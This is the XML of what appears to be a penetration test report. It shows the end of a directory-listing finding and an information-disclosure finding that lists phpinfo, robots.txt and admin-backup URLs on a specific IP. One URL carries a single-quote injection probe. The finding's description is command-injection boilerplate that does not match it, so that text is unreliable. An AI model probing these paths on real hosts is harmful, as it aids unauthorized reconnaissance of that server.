          </w:p>
          <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1. Navigate to above URLs and Observe the directory Listing</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A731423" wp14:editId="0E873F45">
                  <wp:extent cx="7245350" cy="38944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245350" cy="3894455"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Directory Listing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="005453D1">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Remediation:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="005453D1" w:rsidRPr="005453D1">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Configure the web server to deny listing of directories.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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5453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005453D1" w:rsidRDefault="005453D1"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tbl>
      <w:tblPr>
        <w:tblW w:w="1152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919"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1920"/>
        <w:gridCol w:w="1921"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9601" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Information Disclosure</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1919" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="005453D1" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0004341D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00F8662B" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instances</w:t>
            </w:r>
            <w:r w:rsidR="00A81704" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00F8662B" w:rsidP="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId37" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/phpinfo.php</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00F8662B" w:rsidP="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId38" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=%27</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00F8662B" w:rsidP="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId39" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/robots.txt</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00F8662B" w:rsidP="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId40" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/seed</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="00F8662B" w:rsidRDefault="00F8662B" w:rsidP="00F8662B">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Navigate to above URL and </w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Observe the sensitive information displayed.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00F8662B" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BA07863" wp14:editId="0770322E">
                  <wp:extent cx="7245350" cy="38944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245350" cy="3894455"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r w:rsidR="00F8662B">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Information Disclosure</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
